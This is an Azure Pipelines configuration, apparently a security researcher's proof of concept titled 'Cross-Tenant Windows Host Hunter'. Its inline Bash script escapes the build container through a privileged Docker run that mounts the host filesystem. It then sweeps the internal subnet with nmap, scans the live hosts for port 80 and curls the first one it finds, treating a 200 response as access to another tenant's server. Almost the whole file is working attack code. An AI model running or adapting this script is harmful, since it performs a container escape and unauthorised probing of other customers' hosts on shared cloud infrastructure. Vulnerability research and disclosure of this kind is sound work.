# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: FinalPoc
  displayName: 'Final PoC: Cross-Tenant Windows Host Hunter'
  jobs:
  - job: Linux_Windows_Host_Hunter
    displayName: 'PoC: Find and Probe Internal Windows Runners'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Escape Container, Hunt for Windows, and Probe HTTP'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            id
            exit 1
          fi
          echo "✅ Confirmed user is in 'docker' group."
          
          echo "--- Installing tools (Nmap) ---"
          sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
          
          SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
          echo "Discovered internal subnet: $SUBNET"

          echo "--- ESCAPING CONTAINER to hunt for a Windows host on the network ---"
          
          docker run --rm --privileged --network=host -v /:/hostfs \
            -v /usr/bin/nmap:/usr/bin/nmap \
            alpine:latest sh -c "
              # Create a directory on the HOST we can write to
              mkdir -p /hostfs/tmp/scan_results

              echo '--- [HOST] Identifying all live hosts on the subnet ---'
              chroot /hostfs /usr/bin/nmap -sn -T4 ${SUBNET} -oG /tmp/scan_results/host-sweep.gnmap

              grep 'Status: Up' /hostfs/tmp/scan_results/host-sweep.gnmap | awk '{print \$2}' > /hostfs/tmp/scan_results/hosts-up.txt
              
              LIVE_HOST_COUNT=\$(wc -l < /hostfs/tmp/scan_results/hosts-up.txt)
              echo \"--- [HOST] Found \$LIVE_HOST_COUNT live hosts.\"

              if [ \"\$LIVE_HOST_COUNT\" -lt 2 ]; then # Check for at least one other host
                echo '[!] Not enough other live hosts found to scan.'
                exit 0
              fi

              echo '--- [HOST] Scanning all live hosts for open port 80 (HTTP)... ---'
              chroot /hostfs /usr/bin/nmap -sT -p 80 --open -T4 -iL /tmp/scan_results/hosts-up.txt -oG /tmp/scan_results/http-hosts.gnmap
            "
          
          # Now, copy the results back to our artifacts folder
          sudo cp /tmp/scan_results/* artifacts/
          sudo rm -rf /tmp/scan_results

          echo "--- Parsing results to find a target ---"
          # Extract the first IP address that has port 80 open
          TARGET_IP=$(grep '80/open' artifacts/http-hosts.gnmap | awk '{print $2}' | head -n 1)

          if [ -z "$TARGET_IP" ]; then
            echo "⚠️ HUNT FAILED: No hosts with port 80 open were found in this run."
            echo "The network is dynamic; this may require multiple runs."
            exit 0
          fi
          
          echo "✅ SUCCESS: Found a potential Windows host with HTTP open at ${TARGET_IP}"
          echo "--- Probing the discovered HTTP service for conclusive evidence ---"
          
          docker run --rm --privileged --network=host alpine:latest sh -c "
            apk add --no-cache curl
            echo '--- [HOST] Retrieving HTTP response from ${TARGET_IP} ---'
            curl -i -v --max-time 20 http://${TARGET_IP}/
          " > artifacts/final-http-probe.txt 2>&1 || true

          echo "✅ PROBE COMPLETE."
          echo "--- Full HTTP Response from ${TARGET_IP} ---"
          cat artifacts/final-http-probe.txt
          
          if grep -q "HTTP/1.1 200 OK" artifacts/final-http-probe.txt; then
            echo "✅✅✅ SMOKING GUN: Successfully retrieved data from another tenant's internal web server."
          else
            echo "⚠️ Test inconclusive. Found an open HTTP port but could not retrieve data."
          fi

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Final PoC Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-final-poc-windows-hunter'
